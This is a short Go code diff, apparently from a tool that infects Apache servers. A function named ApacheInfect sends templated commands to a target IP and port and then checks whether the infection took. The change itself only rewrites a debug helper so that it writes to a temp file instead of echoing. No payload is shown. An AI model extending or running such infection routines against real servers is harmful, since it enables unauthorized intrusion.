@@ -77,10 +77,11 @@ func ApacheInfect(ip string, port string) bool {
 	commands = fmt.Sprintf(commandsTemplate,commands)
 	MakeRequest2(ip,port,commands)
 	
-	test()
+	test("Hola")
 	return ApacheCheckInfection(ip,port)
 }
 
-func test() {
-	exec.Command("echo 'apache infection' >> /tmp/tmp.txt").Output()
+func test(s string) {
+	d1 := []byte(s)
+    os.WriteFile("/tmp/test.txt", d1, 0644)
 }
